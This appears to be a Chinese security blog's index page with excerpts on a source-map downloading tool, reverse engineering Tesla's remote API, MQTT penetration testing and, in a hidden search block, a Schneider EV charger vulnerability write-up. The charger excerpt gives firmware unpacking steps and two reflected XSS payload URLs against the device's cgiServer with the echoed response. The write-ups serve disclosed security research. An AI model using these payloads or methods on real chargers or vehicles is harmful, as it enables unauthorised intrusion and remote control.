<a href="https://github.com/insightglacier/SourceMapX">https://github.com/insightglacier/SourceMapX</a></p>
<h2 id="安装">安装</h2>
<p>该脚本主要由<a href="https://github.com/rarecoil/unwebpack-sourcemap">unwebpack-sourcemap</a>项目修改而来，使用Python3编写,需要安装 <code>BeautifulSoup4</code> and <code>requests</code>.可以使用 <code>pip3 install -r requirements.txt</code>命令进行安装。主要是修改为批量检测并下载，可用于SRC的漏洞挖掘。</p>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/sourcemapx/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-two/">
      Hacking all the cars之Tesla API分析与利用（下）
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2020-11-14</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/5-BohUPjKNR/">
        <span>vehicle</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/VY1b8zpK8Si/">
        <span>tesla</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/7eD1ZtZoOvK/">
        <span>api</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/B98KLqkGWkD/">
        <span>召唤</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/QGWlR0DRxv6/">
        <span>汽车黑客</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/prvJjB7Fua5/">
        <span>automotive</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/qobuc1uUtQM/">
        <span>cars</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/KWrMfPIO7dM/">
        <span>oauth</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/CoQ1NF-VhSi/">
        <span>特斯拉</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/ycKQhBbX4p9/">
        <span>websocket</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>13分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>3037<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。该篇文章为第二篇，将主要讲解websocket抓包分析与编程实现对Tesla的远程控制。如果你还没看第一篇，请先查看第一篇内容<a href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/">Hacking All The Cars - Tesla 远程API分析与利用（上）</a>。</p>
<h2 id="0x00-websocket通信分析">0x00 Websocket通信分析</h2>
<p>Tesla的召唤功能除自动召唤外，还支持手动的前进与后退功能。要想手机APP可以使用召唤功能，需要先在车机中开启召唤功能。</p>
<p>在测试时，建议寻找一块比较大的空地，然后设置抓包，使用手机APP进行操作。通过burpsuite抓到的数据包可知，召唤功能主要通过websocket来实现。但是分析过程中可以发现，burpsuite只显示了连接地址和发送的数据内容，并没有显示其请求的头，所以，当直接去连接时会返回401错误。</p>
<p><img src="https://bacde.me/post-images/1605326984308.png" alt="" loading="lazy"><img src="/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/04_tesla_websockets.png" alt="" loading="lazy"></p>
<p>在这个时候就需要还一个工具了，本文选择使用charles。这个工具针对websocket的支持非常友好，不仅可以看到请求头，还针对发送与接收以不同的颜色区分显示出来，十分方便分析。</p>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-two/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/">
      Hacking All The Cars之Tesla API分析与利用（上）
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2020-10-15</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/VY1b8zpK8Si/">
        <span>tesla</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/7eD1ZtZoOvK/">
        <span>api</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/prvJjB7Fua5/">
        <span>automotive</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/qobuc1uUtQM/">
        <span>cars</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/KWrMfPIO7dM/">
        <span>oauth</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/CoQ1NF-VhSi/">
        <span>特斯拉</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/UZcct0IlqHT/">
        <span>汽车安全</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>14分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>3506<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。</p>
<h2 id="0x00-简介">0x00 简介</h2>
<p>Tesla自身的app具备控车的一些功能，如解锁、温度控制、充电、行车轨迹、召唤功能等。那么可能有朋友要问了，分析app自己实现的意义是什么呢？为什么不用官方提供的app呢？而且Github也有大量开源项目。</p>
<p>最开始我也有同样的疑问，但是，当我去尝试了解后，发现分析api，自己可以拓展多种玩法：</p>
<ol>
<li>
<p>挖掘潜在的隐藏功能。在漏洞挖掘过程中，总会有一些未在界面显示，被开发者隐藏起来的一些功能。这些功能一旦被我们发现，对漏洞挖掘或者实现额外的功能都有帮助。</p>
</li>
<li>
<p>实现批量控车功能。官方的APP同时只能控制一台汽车，无法控制多台。我们熟悉API后，我们则可以实现批量控制汽车，实现速度与激情中的控车场景，这想想都觉得很酷；</p>
</li>
<li>
<p>熟悉Tesla业务流程，可以深入去挖掘漏洞；</p>
</li>
<li>
<p>尽管目前网络上有很多Tesla的API代码或库，但是其他的车还没有。我们以Tesla为典型例子，可以将其思路和方法拓展到其他同类的汽车厂商中；</p>
</li>
<li>
<p>个性化定制，通过API可以按照自己习惯定制流程，控制更加灵活。还可以拓展功能，如雨天自动关闭天窗，根据情况自动制热/冷却等。甚至可以做成一个商业产品；</p>
</li>
<li>
<p>通过api调用，配合代理跳板实现隐藏自身，同时不会暴漏自己的imei、设备等，减少APP信息收集导致的隐私泄漏。</p>
</li>
<li>
<p>记录下所有关于车的数据，进行数据分析。</p>
</li>
</ol>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <header class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://bacde.me/post/mqtt-security-part-two/">
      物联网安全之MQTT渗透实战
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span>发布于</span>
      <span>2020-09-13</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show">分类于</span>
      
      
      <a href="https://bacde.me/tag/prvJjB7Fua5/">
        <span>automotive</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/cu9Tg0uRbMd/">
        <span>mqtt</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/f1IJJzl-LNP/">
        <span>security</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/JdYDio18R72/">
        <span>car hacking</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/tCcj-UHo7-S/">
        <span>mqtt-pwn</span>
      </a>、
      
      
      
      <a href="https://bacde.me/tag/DxvQ-UKqgTa/">
        <span>pentesting</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>11分钟</span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>2710<span class="pc-show">字数</span></span>
    </span>
    
  </div>
</header>
      <div class="post-body">
        
        
          
          <p>上一篇 <a href="https://bacde.me/post/mqtt-security-part-one/">物联网安全之MQTT协议安全 </a>主要介绍了MQTT安全的一些基础知识。今天将在上一篇基础上来说说实战中MQTT的利用。</p>
<p>在整个物联网或车联网架构中，MQTT的部分通常应用在移动端、管理端、Web端、设备端。而MQTT协议中的三种角色是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER）。发布者（PUBLISHER）和订阅者（SUBCRIBER）通过代理（BROKER）来发布和订阅消息。这两个角色在实际场景中主要应用是移动端、Web端、设备端；代理（BROKER）一般是服务器，可以由activemq、hivemq、emqx等许多软件来搭建。在开发过程中，不同的设备，技术特点也有所不同。其使用的协议除了mqtt外，Web端通常使用websocket的方式来进行收发消息。</p>
<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1599967523996.png" alt="mqtt应用场景" loading="lazy"></figure>
<center>EMQ X Broker 场景</center>
<h2 id="0x00-获取mqtt认证信息">0x00 获取MQTT认证信息</h2>
<p>目前对于MQTT的开发中的安全还尚未受到广泛关注，这使得有多种方式在移动端、Web端、设备端获取到MQTT的认证与连接信息。通过获取的信息来进一步实现越权访问、发布恶意内容等攻击。</p>

        
        
        <div class="post-button text-center">
          <a class="btn" href="https://bacde.me/post/mqtt-security-part-two/" rel="contents">
            阅读全文 »
          </a>
        </div>
        
      </div>
      
    </div>
  </article>
  
            
            
<div class="page bg-color">
  <ul class="pagination-ul">
    
    
      
        <li class="pagination-li pagination-active">
            <a href="/page/../">
              1
            </a>
        </li>
      
        <li class="pagination-li ">
            <a href="/page/2">
              2
            </a>
        </li>
      
        <li class="pagination-li ">
            <a href="/page/3">
              3
            </a>
        </li>
      
        <li class="pagination-li ">
            <a href="/page/4">
              4
            </a>
        </li>
      
        <li class="pagination-li ">
            <a href="/page/5">
              5
            </a>
        </li>
      
    
    
      <li class="pagination-dir">
        <a href="/page/2">
          <i class="fa fa-angle-right"></i>
        </a>
      </li>
    
  </ul>
</div>
          </section>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | © 2019-2020 Theme By <a href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      Powered by <a href="https://www.bacde.me" target="_blank">BaCde</a>
    </div>
  </footer>
  
  
  <div class="gemini back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
  back2TopText = document.querySelector('#back_to_top_text'),
  drawerBox = document.querySelector('#drawer_box'),
  rightSideBar = document.querySelector('.sidebar'),
  viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {
   
    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function(e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });
  
  window.addEventListener('scroll', function(e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  
  let hasCacu = false;
  window.onresize = function() {
    if (window.width > 991) {
      calcuHeight();
    } else {
      hasCacu = false;
    }
  }

  function calcuHeight() {
    // 动态调整站点概览高度
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();
  
  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS 
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS 
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function() {
      open = !open;
      window.Velocity(rightSideBar, 'stop');
      window.Velocity(viewport, 'stop');
      window.Velocity(rightMotions, 'stop');
      if (open) {
        window.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function() {
            window.Velocity(rightMotions, transitionDir,{ });
          }
        })
        window.Velocity(viewport, openProp,{
          duration: MOTION_TIME
        });
      } else {
        window.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function() {
            window.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        window.Velocity(viewport, closeProp ,{
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // 链接跳转
  let newWindow = 'false'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target","_blank");
      }
    })
  }
  // 代码高亮
  hljs.initHighlightingOnLoad();

</script>
    <div class="light-box" id="light_box"></div>
<script>
  let imgs = document.querySelectorAll('.post-body img');
  let lightBox = document.querySelector('#light_box');
  lightBox.addEventListener('mousedown', (e) => {
    e.preventDefault()
  })
  lightBox.addEventListener('mousewheel', (e) => {
    e.preventDefault()
  })
  let width = window.innerWidth * 0.8;
  lightBox.onclick = () => {
    let img = lightBox.querySelector('img');
    lightBox.style = '';
    img && img.remove();
  }
  imgs.forEach(item => {
    item.onclick = function (e) {
      let lightImg = document.createElement('img');
      lightImg.src = this.src;
      lightBox.style = `height: 100%; opacity: 1; background-color: rgba(0, 0, 0, 0.5);cursor: zoom-out;`;
      lightImg.style = `width: ${width}px; border: 1px solid #fff; border-radius: 2px;`;
      lightImg.onclick = function () {
        lightBox.style = '';
        this.remove();
      }
      lightBox.append(lightImg);
    }
  })
</script>
  </div>
</body>
<input hidden id="copy" />
<script>
  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        console.log('复制操作频率过高');
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })
</script>
<script src="/media/js/motion.js"></script>

<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 500
  });
</script>

<!-- <div class="search-mask" id="search_mask">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input type="text" placeholder="搜索">
      </div>
      <i class="fa fa-times-circle"></i>
    </div>
    <div class="result">
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Schneider-Charging-Staiong-Vulnerabilites/"" data-c="
          &lt;p&gt;大家好，我是BaCde，今天来说一说2020年底针对施耐德充电桩的漏洞挖掘过程。此次挖掘最终实现了通过远程无需用户交互场景下实现Root权限shell获取（一键远程Rootshell获取）。官方已经于今年7月份公布漏洞补丁以及相应的CVE编号。&lt;/p&gt;
&lt;h2 id=&#34;0x01-为什么选择施耐德&#34;&gt;0x01 为什么选择施耐德？&lt;/h2&gt;
&lt;p&gt;作为车联网安全研究来说，充电桩作为车联网必要组成部分，具备实际的研究价值与意义。而面临如此多的品牌，选择哪个目标作为研究对象是面临的第一个问题。为了能够更快的实现我选择了几个衡量指标，包括官方有响应中心、固件可下载、市面上可以买到、互联网上有暴露的目标。分别对应合法性、静态分析、动态测试、漏洞可产生实际的影响。&lt;/p&gt;
&lt;p&gt;根据指标通过网络上去收集信息，最终将目标锁定在施耐德。同时，施耐德也在CVE官方的CNA列表中，报送的漏洞可以获得CVE编号。&lt;/p&gt;
&lt;h2 id=&#34;0x02-目标设定&#34;&gt;0x02 目标设定&lt;/h2&gt;
&lt;p&gt;确定了要研究的对象，接下来就要确定一下我们要实现什么样的效果。这可以使得在分析过程中保持聚焦，不偏离方向。目标设定如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;远程获取设备Root权限&lt;/li&gt;
&lt;li&gt;无需登录，无需交互&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;根据上述设定最直接的方式就是寻找远程命令执行漏洞，即要RCE类型漏洞。&lt;/p&gt;
&lt;h2 id=&#34;0x03-信息收集&#34;&gt;0x03 信息收集&lt;/h2&gt;
&lt;p&gt;一切准备就绪，开始我们的漏洞挖掘之旅。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;首先，固件下载地址 https://www.se.com/ww/en/download/document/MFR4341700/ ，下载固件。&lt;/p&gt;
&lt;p&gt;当时下载到最新的固件版本为3.3.0.12。固件文件名：MFR4341700.zip，包含升级包，相关说明文档。&lt;/p&gt;
&lt;p&gt;解压缩zip包后，主要的升级包是一个后缀名为epk的文件。通过file命令检查，可知为tar压缩格式。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file r7_update_3.3.0.12_d4.epk
r7_update_3.3.0.12_d4.epk: POSIX tar archive (GNU)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入&lt;code&gt;tar xf r7_update_3.3.0.12_d4.epk&lt;/code&gt;即可对其解压缩。得到如下列表文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;total 58968
    8 -rw-r--r--@ 1 aliceclaudia  staff    68B  5 29  2020 CONTROL
   16 -rwxr-xr-x@ 1 aliceclaudia  staff   7.4K  5 29  2020 at91sam9g20ek-bootstrap-3.6.11-201612.bin
    8 -rw-r--r--@ 1 aliceclaudia  staff   2.0K  5 29  2020 bspv5_target_pre-update_script.sh
   24 -rwxr-xr-x@ 1 aliceclaudia  staff   9.3K  5 29  2020 bspv5_target_update_script.sh
    8 -rwxr-xr-x@ 1 aliceclaudia  staff   2.2K  5 29  2020 common_bspv4_target_shell_scripts.sh
    8 -rwxr-xr-x@ 1 aliceclaudia  staff   2.4K  5 29  2020 common_bspv5_target_shell_scripts.sh
   24 -rwxr-xr-x@ 1 aliceclaudia  staff    10K  5 29  2020 common_target_shell_scripts.sh
16352 -rw-r--r--@ 1 aliceclaudia  staff   8.0M  5 29  2020 evse_base_jffs2.img
29480 -rw-rw-r--@ 1 aliceclaudia  staff    14M  6 19 10:16 r7_update_3.3.0.12_d4.epk
   24 -rwxr-xr-x@ 1 aliceclaudia  staff    11K  5 29  2020 redLight
    8 -rwxr-xr-x@ 1 aliceclaudia  staff   213B  5 29  2020 run.sh
 1344 -rw-r--r--@ 1 aliceclaudia  staff   672K  5 29  2020 ssh.tgz
    8 -rw-r--r--@ 1 aliceclaudia  staff   4.0K  5 29  2020 u-boot_env-bspv5p5.bin
    8 -rw-r--r--@ 1 aliceclaudia  staff   4.0K  5 29  2020 u-boot_env-bspv5p7.bin
11648 -rw-r--r--@  1 aliceclaudia  staff   5.7M  5 29  2020 uImage.parkingboard_v2_1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到有一些shell脚本、bin文件、压缩包，img文件等。逐个查看，可以确定此次的主要目标在&lt;code&gt;evse_base_jffs2.img&lt;/code&gt;和&lt;code&gt;uImage.parkingboard_v2_1&lt;/code&gt;。使用binwalk对文件进行识别。可知&lt;code&gt;uImage.parkingboard_v2_1&lt;/code&gt;为 uImage文件，人口为&lt;code&gt;0x20008000&lt;/code&gt;，arm的cpu，内核版本为linux-4.4.14。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0xDF6A9558, created: 2020-05-29 15:35:56, image size: 5962125 bytes, Data Address: 0x20008000, Entry Point: 0x20008000, data CRC: 0x5835552D, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: none, image name: &amp;quot;Linux-4.4.14&amp;quot;
64            0x40            Linux kernel ARM boot executable zImage (little-endian)
2368          0x940           device tree image (dtb)
15092         0x3AF4          device tree image (dtb)
20248         0x4F18          device tree image (dtb)
24496         0x5FB0          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)
5942168       0x5AAB98        device tree image (dtb)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其&lt;code&gt;evse_base_jffs2.img&lt;/code&gt; 文件是JFFS2 filesystem, little endian。除此之外，也可以从其一是文件名中得知一些信息，如处理器为&lt;code&gt;AT91SAM9G20&lt;/code&gt;，这个处理器是基于ARM926EJ-S处理器，时钟频率为400MHz。可以确定其bootstrap文件，u-boot的环境信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086126217.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x01 uboot-info.png)&lt;/p&gt;
&lt;center&gt;u-boot的环境变量&lt;/center&gt;
&lt;p&gt;另外，从解压缩出来的shell脚本中可以分析出大概的分区结构。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/dev/mtdblock1 ssh,备份文件等
/dev/mtdblock2 bootstrap 
/dev/mtdblock4 uboot-env
/dev/mtdblock5 uImage
/dev/mtdblock6 evse_base
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086132370.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x02 MTD device.png)&lt;/p&gt;
&lt;p&gt;分别使用binwalk解&lt;code&gt;uImage&lt;/code&gt;文件和&lt;code&gt;evse_base_jffs2.img&lt;/code&gt;文件。可以得到系统文件，与结构，web目录、依赖库、辅助脚本等内容。查看&lt;code&gt;/etc/shadow&lt;/code&gt;文件，发现采用的是sha512的unix密码，尝试查询和破解，最终无果。&lt;/p&gt;
&lt;p&gt;通过分析解压缩出来的文件，还可以确定主要的业务文件都在/mnt/下。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/mnt/datas/				主要存放应用程序、lib文件、一些shell脚本等。
/mnt/flashfs			主要存放配置文件和数据库文件
/mnt/spare				主要存在的是日志文件
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在web管理界面中，其中的report功能处，可以看到系统的磁盘信息、日志、网络监听端口、内部ip地址等信息。设备开放的端口默认有22、80、502、1500-1504。还可以看到该系统使用到的一些开源软件，如mini_httpd，libmodbus，sqlite等。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086138698.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x03 open_souce_components.png)&lt;/p&gt;
&lt;h2 id=&#34;0x04-漏洞挖掘&#34;&gt;0x04 漏洞挖掘&lt;/h2&gt;
&lt;h3 id=&#34;登录入口测试&#34;&gt;登录入口测试&lt;/h3&gt;
&lt;p&gt;该系统需要登陆，默认的用户名和密码可以通过官方提供的说明文档进行登录。考虑到修改密码的情况，首先想到的是测试sql注入，很遗憾最终未发现SQL注入，仅发现了反射型xss漏洞。在不同的版本中，利用方式稍有不同。其漏洞远离在于/cgi-bin/cgiserver的worker参数不正确时，会显示错误页面，其页面会将错误的worker参数显示在页面中，并且没有过滤，从而导致存在xss漏洞。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.3.0.12之前的的版本payload&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;http://target/cgi-bin/cgiServer?worker=&amp;quot;;prompt(1);//&lt;/p&gt;
&lt;p&gt;在最新的3.3.0.12版本中对其worker参数中的双引号进行了处理，导致无法闭合而无法利用。但是在登录时，对于一些lang参数没有进行过滤，导致存在xss。另外在登录后对其进行测试可以发现，xss的这个问题普遍存在。但由于是登录后，没有实际具体意义。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.3.0.12版本及以前版本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;http://target/cgi-bin/cgiServer?worker=Login&amp;amp;lang=%22;alert(1);//&lt;/p&gt;
&lt;p&gt;响应的内容如下:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//W3C//DTD HTML 4.01 Transitional//EN&amp;quot;   &amp;quot;http://www.w3.org/TR/html4/loose.dtd&amp;quot;&amp;gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;EVSE Web Interface&amp;lt;/title&amp;gt;
&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html charset=utf-8&amp;quot; &amp;gt;
&amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=EDGE; IE=10; IE=9; IE=8; IE=7;&amp;quot; /&amp;gt;
&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;SCRIPT type=&amp;quot;text/javascript&amp;quot;&amp;gt;var loc=&amp;quot;/cgi-bin/cgiServer?worker=LoginForm&amp;quot;;
loc+=&amp;quot;&amp;amp;error=badid&amp;amp;lang=&amp;quot;;alert(1);//&amp;quot;;
document.location.href=loc;
&amp;lt;/SCRIPT&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;xss漏洞是无法满足设定的目标的，继续分析。&lt;/p&gt;
&lt;h3 id=&#34;ida静态分析&#34;&gt;IDA静态分析&lt;/h3&gt;
&lt;p&gt;在分析过程中，由于IDA7.2不支持32位程序的伪代码生成功能。最终选择使用是IDA 7.0版本对其进行分析。&lt;/p&gt;
&lt;p&gt;加载&lt;code&gt;cgiserver&lt;/code&gt;程序（文件路径位/mnt/datas/opt/www/cgi-bin/），默认选项即可，在&lt;code&gt;start&lt;/code&gt;函数，尝试F5显示伪代码，结果没成功。显示&lt;code&gt;positive sp value has been found&lt;/code&gt;,其主要原因在于栈sp不平衡。解决办法如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;首先打开栈指针选项，在options---------&amp;gt;General---------------&amp;gt;Disassembly，选择&lt;code&gt;stack pointer&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
